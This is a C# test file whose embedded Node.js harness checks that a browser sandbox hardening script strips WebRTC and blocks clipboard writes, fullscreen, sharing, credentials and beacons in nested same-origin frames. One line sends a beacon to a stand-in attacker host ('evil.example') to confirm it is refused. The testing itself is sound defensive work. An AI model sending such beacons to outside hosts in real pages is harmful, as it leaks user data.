using System.Diagnostics;
using System.Text.Json.Nodes;
using Marrow.Services.Web;
using Marrow.Testing;

namespace Marrow.Services.Tests.Web;

// PORT-ONLY: web surfaces security review 2026-10-13, finding M5 (ED-NEW-web-sec-artifacts-2; DESIGN.md 6.5 "WebRTC ... deleted
// ... before any page script runs", 13.4). The hardening script, run for real in Node's VM. Each frame here is a realm of its own
// (its own constructors, prototypes, document and observer), as a same-origin about:blank frame is in the engine. A frame the page
// adds, then a frame added through THAT frame's own document (appendChild, innerHTML, document.write, execCommand), loses WebRTC
// the moment it appears; a frame that appeared there with no hook is hardened when that realm's own contentWindow or
// contentDocument reaches it, at that realm's frame load, and on that realm's mutation records; and the whole hardening (window.open,
// script clipboard writes, fullscreen, pointer lock, notifications, credentials, sharing, beacons, prefetch hints) runs in every
// such realm, once. The real engine runs the same page in SandboxNestedFrameNativeTests.
[Trait("Decision", "ED-NEW-web-sec-artifacts-2")]
public sealed class SandboxNestedRealmScriptTests
{
    private const string Harness = """
        const vm = require('vm'); const fs = require('fs');
        const source = fs.readFileSync(process.argv[2], 'utf8');
        const nth = 'https://a-0123456789-weather.invalid';
        function DOMException(m, n) { const e = Reflect.construct(Error, [m], new.target || DOMException); e.name = n; return e; }
        Object.setPrototypeOf(DOMException.prototype, Error.prototype);
        // One browsing context's realm: its own constructors, prototypes and document, and its child frames by index.
        const makeRealm = (origin, ancestors) => {
          const w = { length: 0, observers: [], listeners: [], location: { origin, ancestorOrigins: ancestors }, DOMException };
          const appear = (frame) => { w[w.length] = frame; w.length += 1; return frame; };
          const child = () => makeRealm(origin, [origin].concat(ancestors || []));
          const html = (text) => { if (/<iframe/i.test(String(text))) appear(child()); };
          w.appear = appear; w.child = child;
          function MutationObserver(f) { this.f = f; this.target = null; w.observers.push(this); }
          MutationObserver.prototype.observe = function (target, options) { this.target = target; this.options = options; };
          w.MutationObserver = MutationObserver;
          for (const name of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCDataChannel', 'RTCIceCandidate']) w[name] = function () {};
          w.open = () => 'a window';
          w.Navigator = function () {};
          w.Navigator.prototype = { share() { return 'shared'; }, sendBeacon() { return true; } };
          w.navigator = Object.create(w.Navigator.prototype);
          w.navigator.mediaDevices = {}; w.navigator.credentials = {};
          w.Notification = function () {};
          w.Clipboard = function () {};
          w.Clipboard.prototype = { write() { return 'wrote'; }, writeText() { return 'wrote'; } };
          w.Node = function () {};
          w.Node.prototype = {
            appendChild(node) { if (node.frame) appear(node.frame); return node; },
            insertBefore(node) { if (node.frame) appear(node.frame); return node; },
            replaceChild(node) { if (node.frame) appear(node.frame); return node; },
          };
          w.Element = function () {};
          w.Element.prototype = {
            append(...nodes) { nodes.forEach((n) => n.frame && appear(n.frame)); },
            insertAdjacentHTML(_, text) { html(text); },
            requestFullscreen() { return 'fullscreen'; },
            requestPointerLock() { return 'locked'; },
          };
          Object.defineProperty(w.Element.prototype, 'innerHTML', { configurable: true, enumerable: true, get() { return this.text || ''; }, set(v) { this.text = v; html(v); } });
          w.CharacterData = function () {}; w.CharacterData.prototype = { after(n) { if (n.frame) appear(n.frame); } };
          w.DocumentFragment = function () {}; w.DocumentFragment.prototype = {};
          w.Range = function () {}; w.Range.prototype = { insertNode(n) { if (n.frame) appear(n.frame); } };
          w.Document = function () {};
          w.Document.prototype = { execCommand(c, u, text) { html(text); return true; }, write(text) { html(text); } };
          const frameProto = () => {
            const p = {};
            Object.defineProperty(p, 'contentWindow', { configurable: true, get() { return this.inner; } });
            Object.defineProperty(p, 'contentDocument', { configurable: true, get() { return this.inner ? this.inner.document : null; } });
            return p;
          };
          w.HTMLIFrameElement = function () {}; w.HTMLIFrameElement.prototype = frameProto();
          w.HTMLFrameElement = function () {}; w.HTMLFrameElement.prototype = frameProto();
          w.HTMLObjectElement = function () {}; w.HTMLObjectElement.prototype = frameProto();
          w.document = Object.create(w.Document.prototype);
          w.document.nodeType = 9;
          w.document.defaultView = w;
          // As the DOM does: the same type, function and capture flag again is the one listener already there.
          w.document.addEventListener = (type, f, capture) => { if (!w.listeners.some((l) => l.type === type && l.f === f && l.capture === capture)) w.listeners.push({ type, f, capture }); };
          w.window = w;
          return w;
        };
        const rtc = (w) => typeof w.RTCPeerConnection;
        const reason = async (start) => { try { await start(); return 'resolved'; } catch (e) { return e && e.name; } };
        (async () => {
          const top = makeRealm(nth, [nth]);
          vm.runInContext(source, vm.createContext(top));
          const s = {};
          const a = top.child();
          top.Node.prototype.appendChild.call({}, { frame: a });
          s.a = rtc(a);
          // Frames added through the frame's own realm, in the same task: no microtask runs in between.
          const b = a.child();
          const kept = { frame: b };
          s.returned = a.Node.prototype.appendChild.call({}, kept) === kept;
          s.nestedAppend = rtc(b);
          s.nestedOpen = String(b.open());
          const element = Object.create(a.Element.prototype);
          element.innerHTML = '<iframe></iframe>';
          s.nestedInnerHTML = rtc(a[1]);
          s.innerHTMLKept = element.innerHTML;
          b.Document.prototype.write.call(b.document, '<iframe></iframe>');
          s.grandchildWrite = rtc(b[0]);
          s.grandchildExec = b.Document.prototype.execCommand.call(b.document, 'insertHTML', false, '<iframe></iframe>');
          s.grandchildExecFrame = rtc(b[1]);
          // Frames that appeared in A with no hook at all, reached through A's own getters.
          const quiet = a.appear(a.child());
          const holder = Object.create(a.HTMLIFrameElement.prototype);
          holder.inner = quiet;
          s.getter = rtc(holder.contentWindow);
          const quietDocument = a.appear(a.child());
          const object = Object.create(a.HTMLObjectElement.prototype);
          object.inner = quietDocument;
          s.documentGetter = object.contentDocument === quietDocument.document ? rtc(quietDocument) : 'wrong document';
          // A's own observer and frame-load listener.
          s.observes = a.observers.length === 1 && a.observers[0].target === a.document;
          const late = a.appear(a.child());
          const watch = (records) => { if (a.observers[0]) a.observers[0].f(records); };
          watch([]);
          s.observer = rtc(late);
          const load = a.listeners.find((l) => l.type === 'load');
          s.loadCapture = !!(load && load.capture === true);
          const loaded = a.appear(a.child());
          if (load) load.f({ target: { tagName: 'IFRAME' } });
          s.load = rtc(loaded);
          let removed = false;
          const hint = { nodeType: 1, tagName: 'LINK', getAttribute: (n) => (n === 'rel' ? 'preconnect' : null), remove() { removed = true; } };
          watch([{ type: 'childList', addedNodes: [hint] }]);
          s.hintRemoved = removed;
          // The rest of the hardening, in A's realm.
          s.copy = a.Document.prototype.execCommand.call(a.document, 'copy');
          s.clipboard = await reason(() => a.Clipboard.prototype.writeText.call({}, 'secret'));
          s.clipboardWrite = await reason(() => a.Clipboard.prototype.write.call({}, []));
          s.fullscreen = await reason(() => a.Element.prototype.requestFullscreen.call({}));
          s.pointerLock = await reason(() => a.Element.prototype.requestPointerLock.call({}));
          s.share = await reason(() => a.navigator.share({}));
          s.beacon = a.navigator.sendBeacon('https://evil.example/b', 'x');
          s.notification = typeof a.Notification;
          s.credentials = typeof a.navigator.credentials;
          s.media = typeof a.navigator.mediaDevices;
          // Each realm is hardened once, however often it is reached.
          top.Node.prototype.appendChild.call({}, {});
          void holder.contentWindow;
          watch([]);
          s.once = [top, a, b, quiet].map((w) => w.observers.length + '/' + w.listeners.filter((l) => l.type === 'load').length).join(' ');
          console.log(JSON.stringify(s));
        })().catch((e) => { console.error(e && e.stack || String(e)); process.exit(1); });
        """;

    [Fact]
    public async Task Hardening_runs_in_every_same_origin_frame_realm_and_reaches_frames_that_realm_adds()
    {
        var s = await RunNode(Harness, Embedded("hardening.js"));

        foreach (var step in new[] { "a", "nestedAppend", "nestedInnerHTML", "grandchildWrite", "grandchildExecFrame", "getter", "documentGetter", "observer", "load" })
            Assert.True(s[step]!.GetValue<string>() == "undefined", $"{step}: the frame kept WebRTC ({s[step]})");
        Assert.True(s["returned"]!.GetValue<bool>());
        Assert.Equal("null", s["nestedOpen"]!.GetValue<string>());
        Assert.Equal("<iframe></iframe>", s["innerHTMLKept"]!.GetValue<string>());
        Assert.True(s["grandchildExec"]!.GetValue<bool>());
        Assert.True(s["observes"]!.GetValue<bool>());
        Assert.True(s["loadCapture"]!.GetValue<bool>());
        Assert.True(s["hintRemoved"]!.GetValue<bool>());
        Assert.False(s["copy"]!.GetValue<bool>());
        foreach (var step in new[] { "clipboard", "clipboardWrite", "fullscreen", "pointerLock", "share" })
            Assert.True(s[step]!.GetValue<string>() == "NotAllowedError", $"{step} was not refused in the frame's realm ({s[step]})");
        Assert.False(s["beacon"]!.GetValue<bool>());
        Assert.Equal(["undefined", "undefined", "undefined"], new[] { "notification", "credentials", "media" }.Select(k => s[k]!.GetValue<string>()));
        Assert.Equal("1/1 1/1 1/1 1/1", s["once"]!.GetValue<string>());
    }

    private static async Task<JsonObject> RunNode(string harness, params string[] files)
    {
        var data = TestDataDirectory.Read();
        Assert.False(string.IsNullOrEmpty(data), "Set MARROW_PORT_DATA_DIR (R-TEST-9).");
        var folder = Path.Combine(data!, "SandboxScripts", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(folder);
        var script = Path.Combine(folder, "harness.cjs");
        File.WriteAllText(script, harness);
        var node = (Environment.GetEnvironmentVariable("PATH") ?? "").Split(Path.PathSeparator)
            .Select(dir => Path.Combine(dir.Trim('"'), "node.exe")).FirstOrDefault(File.Exists);
        Assert.True(node is not null, "Node.js (node.exe on PATH) runs the sandbox script tests.");
        var start = new ProcessStartInfo(node!) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, WorkingDirectory = folder };
        start.ArgumentList.Add(script);
        foreach (var file in files) start.ArgumentList.Add(file);
        using var process = Process.Start(start)!;
        var output = process.StandardOutput.ReadToEndAsync();
        var error = process.StandardError.ReadToEndAsync();
        using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(60));
        try
        {
            await process.WaitForExitAsync(timeout.Token);
        }
        catch (OperationCanceledException)
        {
            process.Kill(entireProcessTree: true); // node did not finish
            throw;
        }

        Assert.True(process.ExitCode == 0, await error);
        return JsonNode.Parse(await output)!.AsObject();
    }

    private static string Embedded(string name)
    {
        var data = TestDataDirectory.Read()!;
        var path = Path.Combine(data, "SandboxScripts", "embedded-" + Guid.NewGuid().ToString("N") + "-" + name);
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllText(path, SandboxScripts.Read(name));
        return path;
    }
}
